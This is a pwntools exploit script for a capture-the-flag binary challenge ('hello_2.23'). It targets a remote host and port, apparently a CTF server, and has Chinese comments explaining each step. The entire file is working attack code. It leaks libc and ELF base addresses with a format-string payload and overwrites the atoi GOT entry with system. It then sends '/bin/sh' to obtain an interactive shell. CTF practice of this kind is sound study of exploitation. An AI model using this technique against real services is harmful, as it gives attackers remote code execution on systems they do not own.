from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/hello_2.23')

# p = process('../file/hello_2.23')
# libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

p = remote('61.147.171.105', '54309')
libc = ELF('../file/libc-2.23.so')

def add(number, name, size, des):
    p.sendlineafter(b'choice>>', b'1')
    p.sendafter(b'phone number:', number)
    p.sendafter(b'name:', name)
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'des info:', des)

def delete(idx):
    p.sendlineafter(b'choice>>', b'2')
    p.sendlineafter(b'index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'choice>>', b'3')
    p.sendlineafter(b'index:', str(idx).encode())

def edit(idx, number, name, des):
    p.sendlineafter(b'choice>>', b'4')
    p.sendlineafter(b'index:', str(idx).encode())
    p.sendafter(b'number:', number)
    p.sendafter(b'name:', name)
    p.sendafter(b'des info:', des)

# 泄露elf基址和libc基址
add(b'%3$p,%9$p\n', b'a\n', 0x18, b'a\n')
show(0)
p.recvuntil(b'0x')
# libc.address = int(p.recvuntil(b',0x', drop=True), 16) - 1012672 # 本地
libc.address = int(p.recvuntil(b',0x', drop=True), 16) - 0xf7380 # 远程
elf.address = int(p.recvuntil(b'\n', drop=True), 16) - 4724
# print(elf.got['atoi'], libc.sym['system'])

"""
所有got地址都包含0x20，而二进制文件反编译的结果显示number、name的输入是通过scanf %s输入的，读到空白字符如0x20会结束，
本地测试也发现空白字符后所有字符会被截断，无法成功，但是远程却可以成功，不知道是不是远程的二进制文件跟网站上下载的不一样。
"""
# number(11) + name(13) + chunk_pointer(8)
# 修改atoi got地址为system
edit(0, b'a\n', b'a' * 13 + p64(elf.got['atoi']) + b'\n', p64(libc.sym['system']) + b'\n')

# 触发atoi('/bin/sh')
p.sendlineafter(b'choice>>', b'/bin/sh')

p.interactive()